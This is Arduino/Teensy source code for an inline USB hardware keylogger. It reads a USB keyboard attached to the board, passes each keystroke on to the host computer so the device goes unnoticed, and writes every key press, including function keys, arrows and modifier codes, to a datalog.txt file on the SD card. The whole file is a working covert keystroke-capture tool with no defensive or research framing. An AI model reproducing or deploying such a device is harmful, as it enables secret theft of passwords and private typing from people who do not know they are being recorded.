#include <USBHost_t36.h>
#include <SD.h>

File dataLog;

USBHost usb;
KeyboardController keyboard1(usb);

const int chipSelect = BUILTIN_SDCARD;

void setup(){
  while (!Serial) ; // wait for Arduino Serial Monitor
  Serial.begin(9600);
  usb.begin();
  keyboard1.attachPress(OnPress);
  keyboard1.attachRelease(OnRelease);  
  if (!SD.begin(chipSelect)) return; //restart until SD card found
  dataLog = SD.open("datalog.txt", FILE_WRITE);
}

void loop() {
  usb.Task();
}

void OnPress(int key){
  //********************* Detect if keys are supported or not ******************//
  if(key==0){
    Serial.println("Unsupported Key, might be prntscrn, key locks, pausebreak, etc.");
    return;
  }
  //**********************  Get Modifiers ***************************//
  short mod = keyboard1.getModifiers();
  Serial.print("mod: ");
  Serial.println(mod);
  changeMods(mod);
  //************************* Press Keys ****************************//
  if (key >= 1 && key <= 26 && key != 10 && key != 9 ) { //Invalid keys, default to letters, from 1-26, except 9 and 10
    Keyboard.press((char)(key + 96));
    Keyboard.release((char)(key + 96));
  }else{
    Keyboard.press(getChar(int(keyboard1.getKey()))); //Imitate keystroke
    dataLog = SD.open("datalog.txt", FILE_WRITE); //log keystroke to SD card
    switch(int(keyboard1.getKey())){
      case 0:   dataLog.print("「nil」"); break;
      case 8:   dataLog.print("「del」"); break;
      case 9:   dataLog.print("「tab」"); break;
      case 10:  dataLog.print("「enter」"); break;
      case 27:  dataLog.print("「esc」"); break;
      case 31:  dataLog.print("「CtrlBksp」"); break;
      case 32 ... 126: dataLog.print((char)key); break; //regular characters
      case 127: dataLog.print("「bksp」"); break;
      case 194: dataLog.print("「F1」"); break;
      case 195: dataLog.print("「F2」"); break;
      case 196: dataLog.print("「F3」"); break;
      case 197: dataLog.print("「F4」"); break;
      case 198: dataLog.print("「F5」"); break;
      case 199: dataLog.print("「F6」"); break;
      case 200: dataLog.print("「F7」"); break;
      case 201: dataLog.print("「F8」"); break;
      case 202: dataLog.print("「F9」"); break;
      case 203: dataLog.print("「F10」"); break;
      case 204: dataLog.print("「F11」"); break;
      case 205: dataLog.print("「F12」"); break;
      case 209: dataLog.print("「insert」"); break; //numpad
      case 210: dataLog.print("「home」"); break; //numpad
      case 211: dataLog.print("「pgUp」"); break; //numpad
      case 212: dataLog.print("「numDel」"); break; //numpad
      case 213: dataLog.print("「end」"); break; //numpad
      case 214: dataLog.print("「pgdown」");; break; //numpad
      case 215: dataLog.print("「→」"); break; //numpad and regular
      case 216: dataLog.print("「←」"); break; //numpad and regular
      case 217: dataLog.print("「↓」"); break; //numpad and regular
      case 218: dataLog.print("「↑」"); break; //numpad and regular
      default:  dataLog.print("「〚" + String(mod) + "〛" + String(keyboard1.getKey()) + "」"); break; //usually weird keystrokes
                            //Should show up like: 「〚1〛125」, often from weird keystrokes
    }
  }
  dataLog.close();
  Serial.println("Key: " + String((char)key) + " Key Code: " + String(keyboard1.getKey()) + " Raw key: " + String(key) + "\n");
}

void OnRelease(int key){
  Keyboard.release(getChar(key)); 
  Keyboard.release(MODIFIERKEY_LEFT_CTRL);  //Since modifier keys dont update, we just release all modifier keys
  Keyboard.release(MODIFIERKEY_LEFT_SHIFT);
  Keyboard.release(MODIFIERKEY_LEFT_ALT);
  Keyboard.release(MODIFIERKEY_LEFT_GUI);
  Keyboard.release(MODIFIERKEY_RIGHT_CTRL);
  Keyboard.release(MODIFIERKEY_RIGHT_SHIFT);
  Keyboard.release(MODIFIERKEY_RIGHT_ALT);
  Keyboard.release(MODIFIERKEY_RIGHT_GUI);
}

//Sometimes, releasing "(char) key" doesnt work, so exceptions are below
short getChar(int key){ 
  switch(key){
    case 0: return(0); break;
    case 9: return(KEY_TAB); break;
    case 27: return(KEY_ESC); break;
    case 31: return(KEY_BACKSPACE); //ctrl-backspace
    case 128: return(KEY_LEFT_CTRL); break;
    case 129: return(KEY_LEFT_SHIFT); break;
    case 130: return(KEY_LEFT_ALT); break;
    case 131: return(KEY_LEFT_GUI); break;
    case 132: return(KEY_RIGHT_CTRL); break;
    case 133: return(KEY_RIGHT_SHIFT); break;
    case 134: return(KEY_RIGHT_ALT); break;
    case 135: return(KEY_RIGHT_GUI); break;
    case 194: return(KEY_F1); break;
    case 195: return(KEY_F2); break;
    case 196: return(KEY_F3); break;
    case 197: return(KEY_F4); break;
    case 198: return(KEY_F5); break;
    case 199: return(KEY_F6); break;
    case 200: return(KEY_F7); break;
    case 201: return(KEY_F8); break;
    case 202: return(KEY_F9); break;
    case 203: return(KEY_F10); break;
    case 204: return(KEY_F11); break;
    case 205: return(KEY_F12); break;
    case 209: return(KEY_INSERT); break;
    case 210: return(KEY_HOME); break;
    case 211: return(KEY_PAGE_UP); break;
    case 212: return(KEY_DELETE); break;
    case 213: return(KEY_END); break;
    case 214: return(KEY_PAGE_DOWN); break;
    case 215: return(KEY_RIGHT_ARROW); break;
    case 216: return(KEY_LEFT_ARROW); break; 
    case 217: return(KEY_DOWN_ARROW); break;
    case 218: return(KEY_UP_ARROW); break;
    default: return((short)key); //other keys should work normally
  }
}

void changeMods(short mod){
  //  Modifiers are stored in a byte as a boolean 1 or 0, with each bit signifying which modifier key was held down. 
  //  For example, 0b10010001 would be R-GUI, R-Ctrl, and L-Ctrl
  //  OnPress wont trigger unless a non-modifier is pressed, sp this is only called when a key is pressed
  bitRead(mod,0)==1 ? Keyboard.press(MODIFIERKEY_LEFT_CTRL)   : Keyboard.release(MODIFIERKEY_LEFT_CTRL);
  bitRead(mod,1)==1 ? Keyboard.press(MODIFIERKEY_LEFT_SHIFT)  : Keyboard.release(MODIFIERKEY_LEFT_SHIFT);
  bitRead(mod,2)==1 ? Keyboard.press(MODIFIERKEY_LEFT_ALT)    : Keyboard.release(MODIFIERKEY_LEFT_ALT);
  bitRead(mod,3)==1 ? Keyboard.press(MODIFIERKEY_LEFT_GUI)    : Keyboard.release(MODIFIERKEY_LEFT_GUI);
  bitRead(mod,4)==1 ? Keyboard.press(MODIFIERKEY_RIGHT_CTRL)  : Keyboard.release(MODIFIERKEY_RIGHT_CTRL);
  bitRead(mod,5)==1 ? Keyboard.press(MODIFIERKEY_RIGHT_SHIFT) : Keyboard.release(MODIFIERKEY_RIGHT_SHIFT);
  bitRead(mod,6)==1 ? Keyboard.press(MODIFIERKEY_RIGHT_ALT)   : Keyboard.release(MODIFIERKEY_RIGHT_ALT);
  bitRead(mod,7)==1 ? Keyboard.press(MODIFIERKEY_RIGHT_GUI)   : Keyboard.release(MODIFIERKEY_RIGHT_GUI); 
}
